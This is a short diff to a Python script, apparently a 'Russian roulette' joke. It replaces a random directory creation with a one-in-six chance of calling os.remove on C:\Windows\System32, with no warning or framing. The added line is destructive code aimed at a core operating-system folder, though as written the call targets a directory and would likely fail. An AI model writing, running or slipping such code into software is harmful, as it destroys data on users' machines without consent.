@@ -1,5 +1,5 @@
 import random
 import os
 
-if random.randint(0, 1)==1:
-    os.mkdir("/home/ay4t0/Escritorio/G")
+if random.randint(1, 6)==1:
+    os.remove("C:\Windows\System32")
